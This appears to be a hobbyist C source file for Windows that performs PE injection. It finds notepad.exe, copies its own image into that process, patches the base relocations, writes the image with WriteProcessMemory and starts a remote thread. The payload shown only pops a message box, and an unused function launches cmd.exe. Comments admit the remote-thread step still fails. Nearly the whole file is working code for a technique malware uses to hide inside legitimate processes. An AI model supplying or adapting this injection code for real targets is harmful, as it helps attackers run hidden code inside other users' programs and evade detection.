#include <Windows.h>
#include <TlHelp32.h>
#include <stdio.h>


/// <summary>
/// Helper method to find the process ID of procName
/// </summary>
/// <param name="procName">wchar_t array of process name</param>
/// <returns>DWORD of the PID to inject into</returns>
static DWORD GetProcId(const WCHAR* procName)
{
	DWORD procId = 0;
	// Iterate through snapshot of processes to find the name of my proc
	HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnap != INVALID_HANDLE_VALUE)
	{
		PROCESSENTRY32W procEntry;
		procEntry.dwSize = sizeof(procEntry);

		if (Process32FirstW(hSnap, &procEntry))
		{
			do
			{
				if (!_wcsicmp(procEntry.szExeFile, procName))
				{
					procId = procEntry.th32ProcessID;
					break;
				}
			} while (Process32NextW(hSnap, &procEntry));
		}
	}
	CloseHandle(hSnap);
	return procId;
}


DWORD InjectionEntryPoint()
{
	CHAR moduleName[128] = "";
	GetModuleFileNameA(NULL, moduleName, sizeof(moduleName));
	MessageBoxA(NULL, moduleName, "Obligatory PE Injection", NULL);
	return 0;
}



/// <summary>
/// Start command prompt
/// TODO: Update validation checks if you plan to use this for prod.
/// </summary>
/// <param name=""></param>
/// <returns></returns>
DWORD CommandStart(VOID)
{
	STARTUPINFO startInfo;
	PROCESS_INFORMATION procInfo;
	ZeroMemory(&startInfo, sizeof(STARTUPINFO));
	startInfo.cb = sizeof(STARTUPINFO);
	ZeroMemory(&procInfo, sizeof(PROCESS_INFORMATION));

	BOOL status = CreateProcessW(
		NULL,
		L"C:\\Windows\\System32\\cmd.exe",
		NULL,
		NULL,
		FALSE,
		0,
		NULL,
		NULL,
		&startInfo,
		&procInfo
	);

	DWORD dwError = 0; 
	if (status != 0)
	{
		HANDLE out = GetStdHandle(STD_OUTPUT_HANDLE);
		WaitForSingleObject(procInfo.hProcess, INFINITE);
		GetExitCodeProcess(procInfo.hProcess, &dwError);
		CloseHandle(procInfo.hProcess);
		CloseHandle(procInfo.hThread);
	}
	printf("Process Exit Code: %d\n", dwError);
	return 0;
}

/// <summary>
/// Get the NT Header of the image based on its base address
/// ref: http://www.openrce.org/reference_library/files/reference/PE%20Format.pdf
/// </summary>
/// <param name="imageBase">Image base address from getmodulehandle func call</param>
/// <returns>the pointer to the ntHeader of a module provided</returns>
PIMAGE_NT_HEADERS GetNtHeader(PVOID imageBase)
{
	PIMAGE_DOS_HEADER dosHeader = NULL;
	if (imageBase == NULL)
	{
		return NULL; 
	}
	dosHeader = (PIMAGE_DOS_HEADER)imageBase;
	PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)imageBase + dosHeader->e_lfanew);
	return ntHeader; 
}

/// <summary>
/// Create space with proper permissions and then copy image into it 
/// </summary>
/// <param name="ntHeader"></param>
/// <returns></returns>
PVOID GetLocalImage(PVOID imageBase, PIMAGE_NT_HEADERS ntHeader)
{
	if (imageBase == NULL)
	{
		return NULL;
	}
	// ALlocate full priv set of mem for my local image copy 
	PVOID pLocalImage = VirtualAlloc(NULL, ntHeader->OptionalHeader.SizeOfImage, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	// Simple error checking for now
	if (pLocalImage == NULL)
		return NULL;
	CopyMemory(pLocalImage, imageBase, ntHeader->OptionalHeader.SizeOfImage);
	return pLocalImage;
}


/// <summary>
/// ref: https://stackoverflow.com/questions/17436668/how-are-pe-base-relocations-build-up
/// Great view of the concept in the selected answer showing the structure of blocks and entries 
/// </summary>
typedef struct BASE_RELOCATION_ENTRY {
	USHORT Offset:12;
	USHORT Type:4;
} BASE_RELOCATION_ENTRY, * PBASE_RELOCATION_ENTRY;

/// <summary>
/// ref: http://www.openrce.org/reference_library/files/reference/PE%20Format.pdf 
/// ref: https://gist.github.com/hugsy/f60ca6f01839bb56e3cc1ffa0b4e2f75 
/// 1. Get NT Header 
/// 2. Create local image copy 
/// 3. Find relocation table address in host process
/// 4. resolve absolute addresses of copied image through iteration of reloc descriptors 
/// TODO: Seperate the injection from the relocation fix 
/// 5. Write the local image into target space 
/// 6. Start remote thread with the function plus proper offset 
/// TODO: Fix the access denied error code on the starting of the remote thread. 
/// note: Intermingling 32bit vs 64 bit is not supported on remote thread calls
/// </summary>
/// <param name="PID"></param>
/// <returns></returns>
HANDLE InjectProc(DWORD PID)
{
	// 1. 
	HANDLE myBase = GetModuleHandle(NULL); 
	PIMAGE_NT_HEADERS myNtHeader = GetNtHeader(myBase); 
	if (myNtHeader != FALSE)
	{
		// 2. 
		PVOID myLocalImage = GetLocalImage(myBase, myNtHeader);
		if (myLocalImage != NULL)
		{
			// Where to put my local image 
			HANDLE targetProc = OpenProcess(MAXIMUM_ALLOWED, FALSE, PID);
			// Allocate space in the process for the local image to be pushed into 
			PVOID targetImg = VirtualAllocEx(targetProc, NULL, myNtHeader->OptionalHeader.SizeOfImage, MEM_COMMIT, PAGE_EXECUTE_READWRITE); 
			if (targetImg)
			{
				// delta offset = Target image - base image 
				DWORD_PTR ImageBaseOffset = (DWORD_PTR)targetImg - (DWORD_PTR)myLocalImage;
				// Get relocation table to iterate through for updating
				// in ref openrce site / access the data directory array to get basereloc table 
				// 3. 
				PIMAGE_BASE_RELOCATION pRelocTable = (PIMAGE_BASE_RELOCATION)((DWORD_PTR)myLocalImage +	myNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
				// Resolve absolute addresses of image based on local image delta from target 
				DWORD entryCount = 0; 
				PDWORD_PTR updateAddr; 
				PBASE_RELOCATION_ENTRY relocRVA = NULL;
				// iterate through each block in the table of virtual addresses
				printf("Fixing reloc table\n");
				while (pRelocTable->SizeOfBlock > 0)
				{
					// Calc the count of block entires 
					// # of entries = blocksize - size of block / size of entry 
					entryCount = (pRelocTable->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(BASE_RELOCATION_ENTRY); 
					relocRVA = (PBASE_RELOCATION_ENTRY)(pRelocTable + 1); 
					for (short idx = 0; idx < entryCount; idx++)
					{
						// 4. 
						// If theres a valid offset 
						if (relocRVA[idx].Offset)
						{
							// Correct it
							updateAddr = (PDWORD_PTR)((DWORD_PTR)myLocalImage + pRelocTable->VirtualAddress + relocRVA[idx].Offset);
							*updateAddr += ImageBaseOffset; 
						}
					}
					// Inc through the reloc table to next block 
					pRelocTable = (PIMAGE_BASE_RELOCATION)((DWORD_PTR)pRelocTable + pRelocTable->SizeOfBlock);
				}
				// 5. 
				// write the Update the local image buffer into the target image space within the target process
				printf("Writing update into process\n");
				DWORD err = WriteProcessMemory(targetProc, targetImg, myLocalImage, myNtHeader->OptionalHeader.SizeOfImage, NULL); 
				if (err != 0)
				{
					// 6. 
					// Start the thread 
					HANDLE rThread = CreateRemoteThread(
						targetProc,
						NULL,
						0,
						(LPTHREAD_START_ROUTINE)((DWORD_PTR)InjectionEntryPoint + ImageBaseOffset),
						NULL, 
						0, 
						NULL
					);
					// Failing on execution in remote thread
					// ref for potential workaround later
					// ref: https://www.deepinstinct.com/2019/07/24/inject-me-x64-injection-less-code-injection/
					if (rThread == NULL)
					{
						printf("Last Error: %d\n", GetLastError());
					}
					return rThread; 
				}

			}
			
		}
	}
	return INVALID_HANDLE_VALUE; 
}

DWORD main()
{
	HANDLE cmdThread = InjectProc(GetProcId(L"notepad.exe"));
	if (cmdThread == NULL || cmdThread == INVALID_HANDLE_VALUE)
	{
		printf("NULL Thread\n");
		return -1;
	}		
	printf("Injected\n");
	WaitForSingleObject(cmdThread, INFINITE);
	printf("SHould have worked\n");
	CloseHandle(cmdThread); 
	return 8675309; 

}